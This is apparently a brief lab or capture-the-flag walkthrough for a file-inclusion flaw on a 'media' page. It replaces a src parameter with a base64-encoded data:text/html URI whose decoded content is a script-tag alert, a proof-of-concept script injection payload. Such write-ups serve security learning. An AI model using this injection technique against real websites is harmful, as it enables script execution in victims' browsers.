trying for this kind of flaw: https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/

Go to the {{your ip adress}}/?page=media&src=nsa page.

Change the src "nsa" by a javascript code, with MIME specified text/html, encode in base 64.

URL become something like:

{{your ip adress}}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiV0FaQSIpPC9zY3JpcHQ+
